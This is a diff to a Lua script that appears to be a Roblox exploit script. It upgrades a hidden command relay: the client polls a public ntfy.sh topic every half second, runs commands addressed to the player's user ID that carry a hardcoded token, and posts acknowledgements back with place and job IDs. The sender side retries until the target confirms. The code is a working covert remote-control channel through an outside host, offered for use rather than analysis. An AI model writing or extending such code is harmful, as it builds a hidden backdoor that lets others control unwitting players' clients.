@@ -862,21 +862,18 @@ AddConnection(
 )
 
 local HIDDEN_CONTROL_TOKEN =
-    "toxcontrol-v3-8a7d3f2c"
+    "toxcontrol-v4-4d19a8c7"
 
-local HiddenSeenNonces = {}
+local HIDDEN_CONTROL_TOPIC =
+    "toxhub-control-v4-global-4d19a8c7"
+
 local HiddenLastID = nil
 local HiddenConnected = false
 local HiddenFailureCount = 0
-
-local function HiddenTopicForUserId(
-    userId
-)
-    return
-        "toxhub-control-v3-"
-        .. tostring(userId)
-        .. "-8a7d3f2c"
-end
+local HiddenStartedAt = os.time()
+local HiddenCommandResults = {}
+local HiddenPendingAcks = {}
+local HiddenSeenEvents = {}
 
 local function ReadHiddenResponse(
     response
@@ -971,11 +968,14 @@ local function HiddenHttpGet(
 end
 
 local function HiddenHttpPost(
-    url,
     body
 )
     body =
         tostring(body or "")
+
+    local url =
+        "https://ntfy.sh/"
+        .. HIDDEN_CONTROL_TOPIC
 
     if RequestFunction then
         local ok, response =
@@ -1019,7 +1019,42 @@ local function HiddenHttpPost(
     end)
 end
 
-local function HandleHiddenPayload(
+local function SendHiddenAck(
+    payload,
+    success
+)
+    local ack =
+        HttpService:JSONEncode({
+            token =
+                HIDDEN_CONTROL_TOKEN,
+            version = 4,
+            kind = "ack",
+            nonce =
+                tostring(
+                    payload.nonce or ""
+                ),
+            actorUserId =
+                tonumber(
+                    payload.actorUserId
+                ) or 0,
+            targetUserId =
+                Player.UserId,
+            success =
+                success == true,
+            placeId =
+                game.PlaceId,
+            jobId =
+                game.JobId,
+            sentAt =
+                os.time()
+        })
+
+    task.spawn(function()
+        HiddenHttpPost(ack)
+    end)
+end
+
+local function HandleHiddenCommand(
     payload
 )
     if typeof(payload)
@@ -1027,7 +1062,7 @@ local function HandleHiddenPayload(
     or payload.token
         ~= HIDDEN_CONTROL_TOKEN
     or payload.kind
-        ~= "toxcontrol"
+        ~= "command"
     or tonumber(
         payload.targetUserId
     ) ~= Player.UserId
@@ -1047,10 +1082,10 @@ local function HandleHiddenPayload(
             payload.sentAt
         ) or 0
 
-    if sentAt <= 0
+    if sentAt < HiddenStartedAt - 1
     or math.abs(
         os.time() - sentAt
-    ) > 20 then
+    ) > 15 then
         return true
     end
 
@@ -1059,16 +1094,20 @@ local function HandleHiddenPayload(
             payload.nonce or ""
         )
 
-    if nonce ~= "" then
-        if HiddenSeenNonces[
-            nonce
-        ] then
-            return true
-        end
+    if nonce == "" then
+        return true
+    end
 
-        HiddenSeenNonces[
-            nonce
-        ] = os.time()
+    if HiddenCommandResults[nonce]
+        ~= nil then
+        SendHiddenAck(
+            payload,
+            HiddenCommandResults[
+                nonce
+            ]
+        )
+
+        return true
     end
 
     local actor =
@@ -1084,14 +1123,75 @@ local function HandleHiddenPayload(
         actor,
         Player
     ) then
+        HiddenCommandResults[
+            nonce
+        ] = false
+
+        SendHiddenAck(
+            payload,
+            false
+        )
+
         return true
     end
 
-    return ExecuteCommand(
-        actor,
-        payload.command,
-        payload.argument
+    local success =
+        ExecuteCommand(
+            actor,
+            payload.command,
+            payload.argument
+        ) == true
+
+    HiddenCommandResults[
+        nonce
+    ] = success
+
+    SendHiddenAck(
+        payload,
+        success
     )
+
+    return true
+end
+
+local function HandleHiddenAck(
+    payload
+)
+    if typeof(payload)
+        ~= "table"
+    or payload.token
+        ~= HIDDEN_CONTROL_TOKEN
+    or payload.kind
+        ~= "ack"
+    or tonumber(
+        payload.actorUserId
+    ) ~= Player.UserId
+    or tonumber(
+        payload.placeId
+    ) ~= game.PlaceId
+    or tostring(
+        payload.jobId or ""
+    ) ~= tostring(
+        game.JobId
+    ) then
+        return false
+    end
+
+    local nonce =
+        tostring(
+            payload.nonce or ""
+        )
+
+    if nonce == ""
+    or HiddenPendingAcks[nonce]
+        == nil then
+        return true
+    end
+
+    HiddenPendingAcks[nonce] =
+        payload.success == true
+
+    return true
 end
 
 local function DecodeHiddenPoll(
@@ -1120,43 +1220,58 @@ local function DecodeHiddenPoll(
             HiddenLastID =
                 outer.id
 
-            local okInner, payload =
-                pcall(function()
-                    return HttpService:
-                        JSONDecode(
-                            tostring(
-                                outer.message
-                                or ""
-                            )
-                        )
-                end)
+            if not HiddenSeenEvents[
+                outer.id
+            ] then
+                HiddenSeenEvents[
+                    outer.id
+                ] = true
 
-            if okInner then
-                HandleHiddenPayload(
-                    payload
-                )
+                local okInner, payload =
+                    pcall(function()
+                        return HttpService:
+                            JSONDecode(
+                                tostring(
+                                    outer.message
+                                    or ""
+                                )
+                            )
+                    end)
+
+                if okInner
+                and typeof(payload)
+                    == "table"
+                and payload.token
+                    == HIDDEN_CONTROL_TOKEN then
+                    if payload.kind
+                        == "command" then
+                        HandleHiddenCommand(
+                            payload
+                        )
+                    elseif payload.kind
+                        == "ack" then
+                        HandleHiddenAck(
+                            payload
+                        )
+                    end
+                end
             end
         end
     end
 end
 
 local function PollHiddenControl()
-    local topic =
-        HiddenTopicForUserId(
-            Player.UserId
-        )
-
     local since =
         HiddenLastID
         and HttpService:
             UrlEncode(
                 HiddenLastID
             )
-        or "5s"
+        or "10s"
 
     local url =
         "https://ntfy.sh/"
-        .. topic
+        .. HIDDEN_CONTROL_TOPIC
         .. "/json?poll=1&since="
         .. since
         .. "&_="
@@ -1214,7 +1329,7 @@ local function StartHiddenControlListener()
     task.spawn(function()
         while not getgenv().Destroyed do
             PollHiddenControl()
-            task.wait(0.75)
+            task.wait(0.5)
         end
     end)
 end
@@ -1228,21 +1343,17 @@ local function SendHiddenControl(
         return false
     end
 
-    local topic =
-        HiddenTopicForUserId(
-            target.UserId
-        )
+    local nonce =
+        HttpService:
+            GenerateGUID(false)
 
     local payload =
         HttpService:JSONEncode({
             token =
                 HIDDEN_CONTROL_TOKEN,
-            version = 3,
-            kind =
-                "toxcontrol",
-            nonce =
-                HttpService:
-                    GenerateGUID(false),
+            version = 4,
+            kind = "command",
+            nonce = nonce,
             actorUserId =
                 Player.UserId,
             actorName =
@@ -1261,11 +1372,54 @@ local function SendHiddenControl(
                 os.time()
         })
 
-    return HiddenHttpPost(
-        "https://ntfy.sh/"
-        .. topic,
-        payload
-    )
+    HiddenPendingAcks[
+        nonce
+    ] = "waiting"
+
+    for _ = 1, 3 do
+        local posted =
+            HiddenHttpPost(
+                payload
+            )
+
+        if not posted then
+            task.wait(0.4)
+            continue
+        end
+
+        local started = tick()
+
+        while tick() - started < 1.8 do
+            local state =
+                HiddenPendingAcks[
+                    nonce
+                ]
+
+            if state == true then
+                HiddenPendingAcks[
+                    nonce
+                ] = nil
+
+                return true
+            end
+
+            if state == false then
+                HiddenPendingAcks[
+                    nonce
+                ] = nil
+
+                return false
+            end
+
+            task.wait(0.08)
+        end
+    end
+
+    HiddenPendingAcks[
+        nonce
+    ] = nil
+
+    return false
 end
 
 StartHiddenControlListener()
@@ -1348,7 +1502,7 @@ local function SendControl(
     else
         CustomNotify(
             mode == "HIDDEN"
-            and "Tox Control hidden relay unavailable"
+            and "Tox Control hidden: target did not confirm"
             or "Tox Control chat command failed",
             Color3.fromRGB(
                 255,
